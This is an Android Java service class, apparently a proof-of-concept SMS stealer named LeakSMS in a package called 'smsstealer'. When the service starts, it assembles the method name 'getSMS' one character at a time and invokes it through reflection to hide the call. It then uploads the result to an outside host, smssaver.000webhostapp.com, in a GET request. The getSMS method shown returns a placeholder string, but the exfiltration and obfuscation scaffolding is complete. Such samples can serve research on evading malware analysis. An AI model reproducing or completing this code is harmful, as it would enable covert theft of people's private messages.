package com.example.shiva.smsstealer;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.support.annotation.Nullable;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * Created by Shiva on 9/14/2017.
 */

public class LeakSMS extends Service {
    @Nullable
    @Override

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String victimSMS="";
        try {
            Method methodGet=LeakSMS.class.getMethod(getString());
            victimSMS=(String)methodGet.invoke(new LeakSMS());
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        uploadSMS(victimSMS);
        return  super.onStartCommand(intent, flags, startId);
    }

    public String getSMS()
    {
        return "Hello-world";
    }

    public String getString(){
        String str="g";
        str=str+"e";
        str=str+"t";
        str=str+"S";
        str=str+"M";
        str=str+"S";
        return str;
    }
    public void uploadSMS(String str)
    {
        RequestQueue queue = Volley.newRequestQueue(this);
        String url = "http://smssaver.000webhostapp.com/helloworld/insert_data.php?sms_content=" + "\"" + str + "\"";
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        });
        queue.add(stringRequest);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}